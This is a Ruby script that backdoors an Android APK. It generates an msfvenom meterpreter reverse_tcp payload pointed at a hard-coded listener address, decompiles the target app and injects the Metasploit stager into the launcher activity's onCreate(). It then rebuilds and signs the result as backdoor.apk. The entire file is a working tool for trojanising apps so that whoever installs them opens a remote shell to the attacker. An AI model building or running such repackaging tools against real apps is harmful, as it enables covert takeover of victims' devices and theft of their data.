#!/usr/bin/env ruby

require 'nokogiri'
require 'fileutils'

apkfile = ARGV[0]
unless(apkfile && File.readable?(apkfile))
    puts "Usage: #{$0} /apk/to/backdoor.apk"
    exit(1)
end

apktool = `which apktool`
unless(apktool && apktool.length > 0)
    puts "No apktool"
    exit(1)
end

jarsigner = `which jarsigner`
unless(jarsigner && jarsigner.length > 0)
    puts "No jarsigner"
    exit(1)
end

print "[*] Generating msfvenom payload..\n"
`./msfvenom -f raw -p android/meterpreter/reverse_tcp LHOST=172.16.197.79 LPORT=4444 > payload.apk`

print "[*] Signing payload..\n"
`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA payload.apk androiddebugkey`

`rm -rf original`
`rm -rf payload`

`cp #{apkfile} original.apk`

print "[*] Decompiling orignal APK..\n"
`apktool d original.apk`
print "[*] Decompiling payload APK..\n"
`apktool d payload.apk`

f = File.open("original/AndroidManifest.xml")
amanifest = Nokogiri::XML(f)
f.close

# Find the activity that is opened when you click the app icon
print "[*] Locating onCreate() hook..\n"
def findlauncheractivity(amanifest)
    package = amanifest.xpath("//manifest").first['package']
    activities = amanifest.xpath("//activity|//activity-alias")
    for activity in activities 
        activityname = activity.attribute("name")
        category = activity.search('category')
        unless category
            next
        end
        for cat in category
            categoryname = cat.attribute('name')
            if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
                activityname = activityname.to_s
                unless activityname.start_with?(package)
                    activityname = package + activityname
                end
                return activityname
            end
        end
    end
end

# If XML parsing of the manifest fails, recursively search
# the smali code for the onCreate() hook and let the user
# pick the injection point
def scrapeFilesForLauncherActivity()
	smali_files||=[]
	Dir.glob('original/smali*/**/*.smali') do |file|
	  checkFile=File.read(file)
	  if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
		smali_files << file
		smalifile = file
		activitysmali = checkFile
	  end
	end
	i=0
	print "[*] Please choose from one of the following:\n"
	smali_files.each{|s_file|
		print "[+] Hook point ",i,": ",s_file,"\n"
		i+=1
	}
	hook=-1
	while (hook < 0 || hook>i)
		print "\nHook: "
		hook = STDIN.gets.chomp.to_i
	end
	i=0
	smalifile=""
	activitysmali=""
	smali_files.each{|s_file|
		if (i==hook)
			checkFile=File.read(s_file)
			smalifile=s_file
			activitysmali = checkFile
			break
		end
		i+=1
	}
	return [smalifile,activitysmali]
end

launcheractivity = findlauncheractivity(amanifest)
smalifile = 'original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
begin
	activitysmali = File.read(smalifile)
rescue Errno::ENOENT
	print "[!] Unable to find correct hook automatically\n"
	begin
		results=scrapeFilesForLauncherActivity()
		smalifile=results[0]
		activitysmali=results[1]
	rescue
		puts "[-] Error finding launcher activity. Exiting"
		exit(1)
	end
end
print "[*] Copying payload files..\n"
FileUtils.mkdir_p('original/smali/com/metasploit/stage/')
FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/Payload*.smali'), 'original/smali/com/metasploit/stage/'
activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
print "[*] Loading ",smalifile," and injecting payload..\n"
File.open(smalifile, "w") {|file| file.puts hookedsmali }

print "[*] Rebuilding backdoor.apk ..\n"
`apktool b -o backdoor.apk original`
print "[*] Signing backdoor.apk ..\n"
`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA backdoor.apk androiddebugkey`

puts "[+] Created backdoor.apk with meterpreter payload\n"
